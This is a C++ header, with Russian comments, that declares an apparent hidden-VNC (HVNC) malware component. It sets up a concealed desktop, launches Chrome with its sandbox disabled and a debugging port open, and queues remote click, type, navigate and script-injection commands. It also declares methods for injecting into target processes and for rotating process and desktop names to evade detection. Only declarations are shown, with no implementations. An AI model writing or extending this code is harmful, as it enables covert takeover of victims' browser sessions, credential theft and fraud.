#pragma once

#include <windows.h>
#include <memory>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <vector>
#include <queue>
#include <string>
#include <chrono>
#include "../logger/file_logger.h"
#include "../stealth/code_injection.h"
#include "../stealth/obfuscation.h"
#include "../stealth/auto_rotation.h"

// Статусы HVNC сессии
enum class HVNCStatus {
    STOPPED = 0,
    STARTING = 1,
    RUNNING = 2,
    STOPPING = 3,
    ERROR_STATE = 4,
    RECOVERING = 5
};

// Типы ошибок HVNC
enum class HVNCError {
    NONE = 0,
    DESKTOP_CREATION_FAILED = 1,
    BROWSER_LAUNCH_FAILED = 2,
    WORKER_THREAD_CRASHED = 3,
    RESOURCE_LEAK_DETECTED = 4,
    TIMEOUT_EXCEEDED = 5,
    ACCESS_DENIED = 6,
    INSUFFICIENT_MEMORY = 7
};

// Команда для HVNC
struct HVNCCommand {
    enum Type {
        CLICK,
        TYPE_TEXT,
        KEY_COMBO,
        SCREENSHOT,
        NAVIGATE,
        INJECT_SCRIPT,
        STOP_SESSION
    } type;
    
    std::string data;
    int x, y;
    bool completed;
    DWORD timestamp;
    
    HVNCCommand(Type t, const std::string& d = "", int px = 0, int py = 0) 
        : type(t), data(d), x(px), y(py), completed(false), timestamp(GetTickCount()) {}
};

// Статистика ресурсов
struct ResourceStats {
    DWORD handleCount;
    SIZE_T workingSetSize;
    DWORD threadCount;
    DWORD gdiObjects;
    DWORD userObjects;
    std::chrono::steady_clock::time_point lastCheck;
    
    ResourceStats() : handleCount(0), workingSetSize(0), threadCount(0), 
                     gdiObjects(0), userObjects(0), lastCheck(std::chrono::steady_clock::now()) {}
};

// Конфигурация HVNC
struct HVNCConfig {
    DWORD maxWorkerThreads = 4;
    DWORD commandTimeoutMs = 30000;  // 30 секунд
    DWORD recoveryTimeoutMs = 60000; // 1 минута
    DWORD resourceCheckIntervalMs = 5000; // 5 секунд
    DWORD maxHandleCount = 1000;
    SIZE_T maxWorkingSetMB = 512;
    bool enableAutoRecovery = true;
    bool enableResourceMonitoring = true;
    std::string defaultBrowserPath = "chrome.exe";
    std::vector<std::string> browserArgs = {
        "--no-sandbox",
        "--disable-dev-shm-usage",
        "--disable-gpu",
        "--remote-debugging-port=9222"
    };
};

class HVNCManager {
private:
    // Состояние и конфигурация
    std::atomic<HVNCStatus> status_{HVNCStatus::STOPPED};
    std::atomic<HVNCError> lastError_{HVNCError::NONE};
    HVNCConfig config_;
    
    // Дескрипторы и ресурсы
    HDESK hiddenDesktop_;
    HWINSTA originalWinsta_;
    HDESK originalDesktop_;
    PROCESS_INFORMATION browserProcess_;
    
    // Многопоточность
    std::vector<std::unique_ptr<std::thread>> workerThreads_;
    std::mutex commandMutex_;
    std::condition_variable commandCV_;
    std::queue<HVNCCommand> commandQueue_;
    std::atomic<bool> shouldStop_{false};
    
    // Мониторинг ресурсов
    std::unique_ptr<std::thread> resourceMonitorThread_;
    ResourceStats currentStats_;
    ResourceStats baselineStats_;
    std::mutex statsMutex_;
    
    // Восстановление
    std::unique_ptr<std::thread> recoveryThread_;
    std::atomic<int> recoveryAttempts_{0};
    std::chrono::steady_clock::time_point lastRecoveryTime_;
    
    // Инъекция кода и стелс
    void* codeInjector_; // Forward declaration to avoid compilation issues
    bool obfuscationEnabled_{true};
    std::string currentDesktopName_;
    std::string currentProcessName_;
    DWORD injectedProcessId_{0};
    int currentInjectionType_{0}; // Will be cast to proper enum type
    
public:
    HVNCManager();
    ~HVNCManager();
    
    // Основные операции
    bool StartSession(const std::string& browserPath = "");
    bool StopSession(DWORD timeoutMs = 10000);
    bool RestartSession();
    
    // Управление командами
    bool ExecuteCommand(const HVNCCommand& command);
    bool ExecuteCommandAsync(const HVNCCommand& command);
    void ClearCommandQueue();
    size_t GetPendingCommandCount();
    
    // Состояние и мониторинг
    HVNCStatus GetStatus() const { return status_.load(); }
    HVNCError GetLastError() const { return lastError_.load(); }
    ResourceStats GetResourceStats();
    bool IsHealthy();
    
    // Конфигурация
    void SetConfig(const HVNCConfig& config) { config_ = config; }
    HVNCConfig GetConfig() const { return config_; }
    
    // Инъекция кода и стелс
    bool StartSessionWithInjection(int injectionType = 0);
    bool InjectIntoTargetProcess(DWORD processId, int type);
    bool CreateHiddenSession(const std::string& targetProcessName = "");
    
    // Управление обфускацией
    void EnableObfuscation(bool enable = true);
    void RotateProcessName();
    void RotateDesktopName();
    std::string GetObfuscatedDesktopName();
    
    // Восстановление
    bool TriggerRecovery();
    bool IsRecovering() const { return status_.load() == HVNCStatus::RECOVERING; }
    
private:
    // Внутренние методы управления
    bool CreateHiddenDesktop();
    bool DestroyHiddenDesktop();
    bool LaunchBrowser(const std::string& browserPath);
    bool TerminateBrowser(DWORD timeoutMs = 5000);
    
    // Управление потоками
    void StartWorkerThreads();
    void StopWorkerThreads(DWORD timeoutMs = 10000);
    void WorkerThreadMain(int threadId);
    void StartResourceMonitor();
    void StopResourceMonitor();
    void ResourceMonitorMain();
    
    // Обработка команд
    bool ProcessCommand(const HVNCCommand& command);
    bool ClickAt(int x, int y);
    bool TypeText(const std::string& text);
    bool SendKeyCombo(const std::string& keys);
    bool TakeScreenshot();
    bool NavigateToUrl(const std::string& url);
    bool InjectScript(const std::string& script);
    
    // Мониторинг и диагностика
    void UpdateResourceStats();
    bool CheckResourceLimits();
    bool DetectMemoryLeaks();
    bool DetectHandleLeaks();
    std::string GetSystemErrorString(DWORD errorCode);
    void LogDetailedError(const std::string& operation, DWORD errorCode);
    
    // Восстановление
    void StartRecoveryThread();
    void StopRecoveryThread();
    void RecoveryThreadMain();
    bool AttemptRecovery();
    bool ValidateSystemState();
    
    // Утилиты
    bool SwitchToHiddenDesktop();
    bool SwitchToOriginalDesktop();
    bool WaitForProcess(HANDLE process, DWORD timeoutMs);
    void CleanupResources();
    bool IsProcessRunning(DWORD processId);
    DWORD GetProcessHandleCount(DWORD processId);
    SIZE_T GetProcessWorkingSet(DWORD processId);
};

// Глобальный менеджер HVNC
extern std::unique_ptr<HVNCManager> g_hvncManager;

// Утилиты для мониторинга ресурсов
class ResourceMonitor {
public:
    static DWORD GetSystemHandleCount();
    static SIZE_T GetSystemMemoryUsage();
    static DWORD GetGDIObjectCount(DWORD processId);
    static DWORD GetUserObjectCount(DWORD processId);
    static bool IsSystemUnderStress();
    static std::vector<DWORD> GetProcessThreads(DWORD processId);
    static bool ValidateHandleIntegrity(HANDLE handle, DWORD expectedType);
};

// Статистика и отчёты
class HVNCReporter {
public:
    static std::string GenerateStatusReport(const HVNCManager& manager);
    static std::string GenerateResourceReport(const ResourceStats& stats);
    static std::string GenerateErrorReport(HVNCError error, DWORD systemError);
    static void LogPerformanceMetrics(const HVNCManager& manager);
    static void LogResourceUsage(const ResourceStats& stats);
};